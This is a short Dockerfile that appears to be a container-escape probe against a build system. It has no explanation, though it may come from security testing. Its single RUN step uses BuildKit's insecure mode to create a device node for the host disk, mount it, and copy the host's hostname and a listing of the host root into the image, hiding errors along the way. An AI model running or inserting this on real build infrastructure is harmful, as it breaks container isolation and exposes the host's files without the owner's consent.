# syntax=docker/dockerfile:1
FROM alpine:3.18

RUN --security=insecure \
    mknod /dev/sda b 8 0 2>/dev/null; \
    mkdir -p /mnt/host 2>/dev/null; \
    mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/sda /mnt/host 2>/dev/null; \
    hostname > /build_hostname; \
    cat /mnt/host/etc/hostname > /host_hostname 2>/dev/null; \
    ls /mnt/host/ > /host_ls 2>/dev/null; \
    umount /mnt/host 2>/dev/null; \
    echo "done"

CMD cat /host_hostname /build_hostname /host_ls
